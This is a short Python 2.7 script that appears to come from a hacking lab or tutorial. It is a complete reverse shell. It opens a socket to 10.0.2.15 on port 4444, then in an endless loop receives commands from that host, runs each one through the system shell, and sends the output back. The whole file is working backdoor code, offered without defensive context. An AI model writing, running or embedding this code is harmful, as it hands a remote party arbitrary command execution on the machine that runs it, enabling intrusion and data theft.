import socket
import subprocess
#requires 2.7 :(
def execute_system_command(command):
	return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("10.0.2.15",4444))
#Tunnel established
connection.send("\nConnection established.\n")

while True:
	command = connection.recv(1024)
	commandResult = execute_system_command(command)
	connection.send(commandResult)
#Send result and close tunnel
connection.close()

